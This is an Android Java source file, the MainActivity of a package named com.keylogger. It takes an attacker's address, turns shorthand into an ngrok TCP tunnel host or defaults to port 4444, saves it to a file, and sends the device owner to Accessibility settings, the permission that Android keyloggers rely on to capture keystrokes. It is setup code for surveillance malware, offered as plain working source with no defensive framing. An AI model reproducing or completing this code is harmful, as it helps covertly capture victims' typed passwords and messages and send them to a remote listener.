package com.keylogger;

import android.Manifest; // Import the FileWriter class
import java.io.IOException;  // Import the IOException class to handle errors
import android.app.*;
import android.os.*;
//import android.util.Log;
import android.widget.*;
import android.view.View.*;
import android.view.*;
import android.content.*;
import android.provider.*;
import java.io.*;
import java.util.jar.*; 
import android.*;
import java.security.*;
import android.content.pm.*;
import java.nio.file.*;


public class MainActivity extends Activity 
	{
    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
		if (new File(getExternalFilesDir("key"),"fix.dat").exists()){
			startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
			finish();
		}else{
		final Button bnt1= findViewById(R.id.mainButton1);
		final EditText txt =findViewById(R.id.mainEditText1);
		txt.setText("");
		bnt1.setOnClickListener( new View.OnClickListener (){
			@Override
			public void onClick(View p1){
				
				String ip = txt.getText().toString();
				if (ip!=""){
					if(scut(ip)){
						ip=ip.split(":")[0].split(",")[0]+".tcp.ngrok.io:"+ip.split(":")[1];
						//Toast.makeText(MainActivity.this,ip,Toast.LENGTH_SHORT).show();
					}
					if (ip!=null){
						if (ip.equals("ip")){
							ip="0.0.0.0:4444";
						}
						save(ip);
						startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
						finish();
					}
					else{
						txt.setText("");
					
				}
			}
			}
		});
		
		}
		
    }
	
	public void save(String s1){
		File f1 = new File(getExternalFilesDir("key"),"fix.dat");
		if (f1.exists()){
			f1.delete();
			
		}
		FileOutputStream fos;
		try{
			fos = new FileOutputStream(f1,true);
			fos.write(s1.getBytes());
		} catch (IOException e) {
			e.printStackTrace();
		}
		
	}//
	public boolean scut(String t1){
		try{
		if(t1.split(":")[0].split(",")[1].equals("n")){
			//Toast.makeText(MainActivity.this,t2,Toast.LENGTH_SHORT).show();
			return true;
		}
		else{
			return false;
		}
		}catch(Exception e){
			return false;
		}
		
	}
	
}



		
		
